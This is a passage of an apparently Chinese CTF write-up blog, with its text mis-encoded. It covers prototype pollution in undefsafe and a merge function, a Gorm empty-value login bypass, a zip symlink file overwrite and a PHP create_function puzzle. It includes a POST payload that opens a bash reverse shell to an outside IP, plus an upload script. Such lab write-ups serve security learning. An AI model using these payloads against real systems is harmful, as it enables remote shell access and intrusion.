-m&quot;</span><br>        &#125;;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> index <span class="hljs-keyword">in</span> commands) &#123;<br>            <span class="hljs-title function_">exec</span>(commands[index], &#123;<span class="hljs-attr">shell</span>:<span class="hljs-string">&#x27;/bin/bash&#x27;</span>&#125;, <span class="hljs-function">(<span class="hljs-params">err, stdout, stderr</span>) =&gt;</span> &#123;<br>                <span class="hljs-keyword">if</span> (err) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`stdout: <span class="hljs-subst">$&#123;stdout&#125;</span>`</span>);<br>            &#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;OK&#x27;</span>);<br>        res.<span class="hljs-title function_">end</span>();<br>    &#125;)<br><span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„for..inï¼šå¾ªç¯å°†éå†å¯¹è±¡æœ¬èº«çš„æ‰€æœ‰å¯æšä¸¾å±æ€§ï¼Œä»¥åŠå¯¹è±¡ä»å…¶æ„é€ å‡½æ•°åŸå‹ä¸­ç»§æ‰¿çš„å±æ€§</span><br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) &#123;<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">404</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Sorry cant find that!&#x27;</span>);<br>&#125;);<br><br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">err, req, res, next</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(err.<span class="hljs-property">stack</span>);<br>  res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">send</span>(<span class="hljs-string">&#x27;Something broke!&#x27;</span>);<br>&#125;);<br><br><br><span class="hljs-keyword">const</span> port = <span class="hljs-number">8080</span>;<br>app.<span class="hljs-title function_">listen</span>(port, <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Example app listening at http://localhost:<span class="hljs-subst">$&#123;port&#125;</span>`</span>))<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç”¨äº†<code>undefsafe</code>è¿™ä¹ˆä¸ªä¸œè¥¿ï¼Œæœäº†ä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼š</p><p><a href="https://skysec.top/2020/06/22/CVE-2019-10795-undefsafe-Prototype-Pollution-Vulnerability/">å‚è€ƒæ–‡ç« </a></p><p>ç®€å•è¯´<code>undefsafe</code>å°±å’Œ<code>merge/clone</code>ä¼¼çš„ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> a = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;undefsafe&quot;</span>);<br><span class="hljs-keyword">var</span> object = &#123;<br>    <span class="hljs-attr">a</span>: &#123;<br>        <span class="hljs-attr">b</span>: &#123;<br>            <span class="hljs-attr">c</span>: <span class="hljs-number">1</span>,<br>            <span class="hljs-attr">d</span>: [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>],<br>            <span class="hljs-attr">e</span>: <span class="hljs-string">&#x27;skysec&#x27;</span><br>        &#125;<br>    &#125;<br>&#125;;<br><br><span class="hljs-keyword">var</span> payload = <span class="hljs-string">&quot;__proto__.toString&quot;</span>;<br><span class="hljs-title function_">a</span>(object,payload,<span class="hljs-string">&quot;evilstring&quot;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(object.<span class="hljs-property">toString</span>);<br><span class="hljs-comment">//evilstring</span><br><span class="hljs-comment">//å½“undefsafeç¬¬2ï¼Œ3ä¸ªå‚æ•°å¯æ§æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥æ±¡æŸ“objectçš„å€¼</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯æ‰¾åˆ©ç”¨è¿™ä¸ªå‡½æ•°çš„åœ°æ–¹ï¼šå­˜åœ¨<code>get_note</code>å’Œ<code>edit_note</code>ä¸¤ä¸ªæ–¹æ³•(ä»¥åŠå¯¹åº”è·¯ç”±)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js">   <span class="hljs-title function_">get_note</span>(<span class="hljs-params">id</span>) &#123;<br>       <span class="hljs-keyword">var</span> r = &#123;&#125;<br>       <span class="hljs-title function_">undefsafe</span>(r, id, <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id));<br>       <span class="hljs-keyword">return</span> r;<br>   &#125;<br><br>   <span class="hljs-title function_">edit_note</span>(<span class="hljs-params">id, author, raw</span>) &#123;<br>       <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.author&#x27;</span>, author);<br>       <span class="hljs-title function_">undefsafe</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">note_list</span>, id + <span class="hljs-string">&#x27;.raw_note&#x27;</span>, raw);<br>   &#125;<br><span class="hljs-comment">//è·¯ç”±ï¼š</span><br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/notes&#x27;</span>)<br>   .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>       <span class="hljs-keyword">let</span> a_note;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_">typeof</span>(q) === <span class="hljs-string">&quot;undefined&quot;</span>) &#123;<br>           a_note = notes.<span class="hljs-title function_">get_all_notes</span>();<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           a_note = notes.<span class="hljs-title function_">get_note</span>(q);<br>       &#125;<br>       res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;note&#x27;</span>, &#123;<span class="hljs-attr">list</span>: a_note&#125;);<br>   &#125;)<br>app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/edit_note&#x27;</span>)<br>   .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;please use POST to edit a note&quot;</span>&#125;);<br>   &#125;)<br>   .<span class="hljs-title function_">post</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>       <span class="hljs-keyword">let</span> id = req.<span class="hljs-property">body</span>.<span class="hljs-property">id</span>;<br>       <span class="hljs-keyword">let</span> author = req.<span class="hljs-property">body</span>.<span class="hljs-property">author</span>;<br>       <span class="hljs-keyword">let</span> enote = req.<span class="hljs-property">body</span>.<span class="hljs-property">raw</span>;<br>       <span class="hljs-keyword">if</span> (id &amp;&amp; author &amp;&amp; enote) &#123;<br>           notes.<span class="hljs-title function_">edit_note</span>(id, author, enote);<br>           res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note sucess&quot;</span>&#125;);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;<span class="hljs-attr">message</span>: <span class="hljs-string">&quot;edit note failed&quot;</span>&#125;);<br>       &#125;<br>   &#125;)<br></code></pre></td></tr></table></figure><p>ä¸è¿‡<code>get_note</code>é‚£ä¸ªåº”ç”¨ä¸äº†ä¸çŸ¥é“ä¸ºå•¥(ç½‘ä¸Šçœ‹å…¶å®ƒå¸ˆå‚…éƒ½ç›´æ¥ç”¨<code>edit_note</code>è¿™ä¸ªè·¯ç”±äº†)ğŸ¤”è¿™ä¸ªè·¯ç”±ä¸‹<code>id,author,enote</code>å…¨éƒ¨å¯æ§ï¼Œç„¶åå’Œ<code>/status</code>è·¯ç”±é…åˆå®ç°å‘½ä»¤æ‰§è¡Œ(æ³¨æ„è¿™ç©æ„å„¿æ²¡å›æ˜¾ï¼Œå»åå¼¹shell)ã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /edit_note<br><br><span class="hljs-attribute">id</span>=__proto__ &amp; author = bash -i &gt; /dev/tcp/<span class="hljs-number">101.32.189.145</span>/<span class="hljs-number">9001</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span> &amp; raw = shadouxing;<br></code></pre></td></tr></table></figure><h2 id="HGAME-week2-WebVPN"><a href="#HGAME-week2-WebVPN" class="headerlink" title="[HGAME-week2]WebVPN"></a>[HGAME-week2]WebVPN</h2><p><code>user/info</code>è·¯ç”±ä¸‹å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/user/info&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (!req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>) &#123;<br>    res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">403</span>);<br>  &#125;<br>  <span class="hljs-title function_">update</span>(userStorage[req.<span class="hljs-property">session</span>.<span class="hljs-property">username</span>].<span class="hljs-property">info</span>, req.<span class="hljs-property">body</span>);<br>  res.<span class="hljs-title function_">sendStatus</span>(<span class="hljs-number">200</span>);<br>&#125;);<br><br><span class="hljs-comment">//updateå‡½æ•°</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">dst, src</span>) &#123;<br>  <span class="hljs-keyword">for</span> (key <span class="hljs-keyword">in</span> src) &#123;<br>    <span class="hljs-keyword">if</span> (key.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;__&quot;</span>) != -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> src[key] == <span class="hljs-string">&quot;object&quot;</span> &amp;&amp; dst[key] !== <span class="hljs-literal">undefined</span>) &#123;<br>      <span class="hljs-title function_">update</span>(dst[key], src[key]);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    dst[key] = src[key];<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é€šè¿‡åŸå‹é“¾æ±¡æŸ“è°ƒç”¨<code>Object</code>ç»™<code>strategy</code>æ·»åŠ æŸäº›å±æ€§(æ³¨æ„content-type)ï¼š</p><p><img src="/img/hgamewebvpn4.png" alt="hgamewebvpn4"></p><p>å†è®¿é—®<code>/home</code>ï¼š</p><p><img src="/img/hgamewebvpn5.png" alt="hgamewebvpn5"></p><p>ç„¶å<code>proxy?url=http://127.0.0.1:3000/flag</code>å³å¯ã€‚</p><h2 id="HGAME-week3-Zero-Link"><a href="#HGAME-week3-Zero-Link" class="headerlink" title="[HGAME-week3]Zero Link"></a>[HGAME-week3]Zero Link</h2><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/18030979">å‚è€ƒæ–‡ç« </a></p><p><a href="https://www.ctfiot.com/123387.html">Goè¯­è¨€ç‰¹æ€§å¼•å‘çš„å®‰å…¨é—®é¢˜çš„æ€è€ƒ</a></p><blockquote><p>Goè¿™é—¨è¯­è¨€æœ¬èº«å¯¹äºâ€œé›¶å€¼â€çš„è®¾è®¡ï¼šä»–æ˜¯æ— æ³•åŒºåˆ†æŸä¸ªç»“æ„ä½“ä¸­æŸä¸ªå­—æ®µæ˜¯å¦æœ‰è¢«èµ‹å€¼è¿‡ã€‚</p></blockquote><p>å¦‚ä½•è·å¾—<code>Admin</code>çš„å¯†ç ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GetUserByUsernameOrToken</span><span class="hljs-params">(username <span class="hljs-type">string</span>, token <span class="hljs-type">string</span>)</span></span> (*User, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">var</span> user User<br>query := db<br><span class="hljs-keyword">if</span> username != <span class="hljs-string">&quot;&quot;</span> &#123;<br>query = query.Where(&amp;User&#123;Username: username&#125;)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>query = query.Where(&amp;User&#123;Token: token&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœä¼ å…¥<code>username</code>çš„å€¼æ˜¯<code>xxx</code>ï¼Œç”Ÿæˆçš„å¯¹åº”æ•°æ®åº“æŸ¥è¯¢è¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;xxx&#x27;</span> LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ä½†å¦‚æœä¼ ç©ºå­—ç¬¦ä¸²ï¼ŒGormåœ¨â½£æˆSQLè¯­å¥æ—¶ä¸ä¼šä¸ºè¯¥å±æ€§â½£æˆæ¡ä»¶è¯­å¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> `<span class="hljs-keyword">user</span>` LIMIT <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿™æ—¶ä»–ä¼šæŸ¥åˆ°è¡¨é‡Œçš„ç¬¬ä¸€ä¸ªç”¨æˆ·(<code>sqlite.go</code>å‘Šè¯‰äº†ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯ç®¡ç†å‘˜)ã€‚</p><p><img src="/img/zerolink3-170911121745111.png" alt="zerolink3"></p><p>ç™»å½•åå­˜åœ¨æ–‡ä»¶ä¸Šä¼ +è§£å‹åŠŸèƒ½ï¼Œå’Œè§£å‹æœ‰å…³çš„éƒ¨åˆ†ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, file := <span class="hljs-keyword">range</span> files &#123;<br>cmd := exec.Command(<span class="hljs-string">&quot;unzip&quot;</span>, <span class="hljs-string">&quot;-o&quot;</span>, file, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;/tmp/&quot;</span>) <span class="hljs-comment">//ä¸»è¦æ˜¯ -oè¿™ä¸ªä¸œè¥¿ï¼Œè¡¨ç¤ºè¦†ç›–å·²å­˜åœ¨çš„æ–‡ä»¶è€Œä¸æç¤ºç”¨æˆ·ã€‚åé¢çš„æ€è·¯å°±æ˜¯åˆ©ç”¨è¿™ä¸ªé€šè¿‡è½¯é“¾æ¥è¦†ç›–æ‹¿flag</span><br><span class="hljs-keyword">if</span> err := cmd.Run(); err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to unzip file: &quot;</span> + file,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/api/secret</code>å®ç°äº†ç‰¹å®šæ–‡ä»¶è¯»å–ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ReadSecretFile</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>secretFilepath := <span class="hljs-string">&quot;/app/secret&quot;</span><br>content, err := util.ReadFileToString(secretFilepath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>c.JSON(http.StatusInternalServerError, FileResponse&#123;<br>Code:    http.StatusInternalServerError,<br>Message: <span class="hljs-string">&quot;Failed to read secret file&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±æ˜¯åˆ©ç”¨è½¯é“¾æ¥é…åˆ<code>unzip</code>å®ç°å¯¹<code>./app/secret</code>ä¸‹å‡flagçš„è¦†ç›–:</p><p><strong>è½¯é“¾æ¥å°†æŸä¸ªç›®å½•è¿æ¥åˆ°å¦ä¸€ä¸ªç›®å½•æˆ–è€…æ–‡ä»¶ä¸‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä»¥åå¯¹è¿™ä¸ªç›®å½•çš„ä»»ä½•æ“ä½œï¼Œéƒ½ä¼šä½œç”¨åˆ°å¦ä¸€ä¸ªç›®å½•æˆ–è€…æ–‡ä»¶ä¸‹ã€‚</strong></p><p>é¦–å…ˆ(è¿™é‡Œå…ˆå»ºç«‹ä¸€ä¸ªåˆ°<code>/app</code>çš„è½¯é“¾æ¥)ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /app <span class="hljs-built_in">link</span><br>zip --symlinks 1.zip <span class="hljs-built_in">link</span><br></code></pre></td></tr></table></figure><p>å‹ç¼©å®Œäº†æŠŠè¿™ä¸ªlinkåˆ äº†ï¼Œåˆ›å»º<code>link/secret</code>ï¼Œ<code>secret</code>é‡Œé¢å†…å®¹æ˜¯<code>/flag</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">zip</span> -r <span class="hljs-number">2.</span><span class="hljs-built_in">zip</span> link <br></code></pre></td></tr></table></figure><p>è¿™æ—¶<code>(link/secret)</code>- &gt;<code>/app/secret</code>ï¼Œè¯»å®ƒç­‰äºè¯»<code>/flag</code>ã€‚</p><p>ä¾æ¬¡ä¸Šä¼ <code>1.zip</code>ï¼Œ<code>2.zip</code>(ä¼ ä¸€æ¬¡å°±è®¿é—®<code>api/unzip</code>è¿›è¡Œè§£å‹)ã€‚å†è®¿é—®<code>/api/secret</code>å°±è¡Œï¼š</p><p><img src="/img/zerolink4.png" alt="zerolink4"></p><p>æœ€åè¿™é¢˜è¿˜æœ‰ä¸ªå°å‘ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> (ext != <span class="hljs-string">&quot;.zip&quot;</span>) || (file.Header.Get(<span class="hljs-string">&quot;Content-Type&quot;</span>) != <span class="hljs-string">&quot;application/zip&quot;</span>) &#123;<br>c.JSON(http.StatusBadRequest, FileResponse&#123;<br>Code:    http.StatusBadRequest,<br>Message: <span class="hljs-string">&quot;Only .zip files are allowed&quot;</span>,<br>Data:    <span class="hljs-string">&quot;&quot;</span>,<br>&#125;)<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å‰ç«¯æ£€æŸ¥æ–‡ä»¶çš„å†…å®¹ç±»å‹æ˜¯å¦ä¸º â€œapplication&#x2F;zipâ€ï¼Œä½†windowsä¸‹ä¸Šä¼ å‹ç¼©åŒ…ä¸€èˆ¬æ˜¯<code>application/x-zip-compressed</code>ï¼Œè¿™ç©æ„å„¿è¿˜ä¸èƒ½æŠ“åŒ…æ”¹ã€‚è§£å†³æ–¹æ³•è¦ä¹ˆç”¨<code>Linux</code>çš„æµè§ˆå™¨ä¼ è¦ä¹ˆå†™ä¸ªè„šæœ¬ä¼ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è„šæœ¬å‚è€ƒhttps://www.cnblogs.com/gxngxngxn/p/18012905</span><br><span class="hljs-keyword">import</span> requests<br><br>Cookie=&#123;<span class="hljs-string">&quot;session&quot;</span>:<span class="hljs-string">&quot;MTcwNzk5ODExOXxEWDhFQVFMX2dBQUJFQUVRQUFBbl80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQWNBQlVGa2JXbHV8_LDldFLPPX3ke76aWroLAK2oFDpN-3gU6pg7-OpdtM0=&quot;</span>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_zip_file</span>(<span class="hljs-params">url, file_path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        file_name = <span class="hljs-string">&#x27;2.zip&#x27;</span>  <span class="hljs-comment"># æŒ‡å®šè¦ä¸Šä¼ çš„æ–‡ä»¶å</span><br>        files = &#123;<span class="hljs-string">&#x27;file&#x27;</span>: (file_name, <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>), <span class="hljs-string">&#x27;application/zip&#x27;</span>)&#125;<br>        response = requests.post(url, files=files,cookies=Cookie)<br><br>        <span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br>            <span class="hljs-built_in">print</span>(response.text)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>)<br><br>    <span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ–‡ä»¶æ‰“å¼€é”™è¯¯ï¼š<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># ç¤ºä¾‹ç”¨æ³•</span><br>upload_url = <span class="hljs-string">&quot;http://106.14.57.14:30864/api/upload&quot;</span><br>zip_file_path = <span class="hljs-string">&quot;C:\\Users\\86183\\Desktop\\fsdownload\\2.zip&quot;</span><br>upload_zip_file(upload_url, zip_file_path)<br></code></pre></td></tr></table></figure><h2 id="SUCTF-2018-annonymous"><a href="#SUCTF-2018-annonymous" class="headerlink" title="[SUCTF 2018]annonymous"></a>[SUCTF 2018]annonymous</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>create_function</code>åˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°ç„¶åç»™<code>$MY</code>ã€‚å†åˆ©ç”¨<code>eval</code>åˆ›å»ºäº†ä¸€ä¸ªå‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">SUCTF_</span>$<span class="hljs-title">hash</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">global</span> \<span class="hljs-variable">$MY</span>;<br>\<span class="hljs-variable">$MY</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶å<code>GET</code>ä¼ å‚<code>func_name</code>ï¼Œå¯ä»¥è¿›è¡Œå‡½æ•°è°ƒç”¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ç°åœ¨çš„é—®é¢˜å°±æ˜¯<code>$hash = bin2hex(openssl_random_pseudo_bytes(32))</code>è¿™ä¸ªä¸œè¥¿ã€‚ã€‚è¿™ä¸ªä¼ªéšæœºæ•°ä¸çŸ¥é“æ€ä¹ˆå¤„ç†ï¼Œ<code>SUCTF_$hash()</code>è¿™ä¸ªå‡½æ•°ä¸çŸ¥é“åå­—æ‰§è¡Œä¸äº†ã€‚</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105225558">å‚è€ƒèµ„æ–™</a></p><p><a 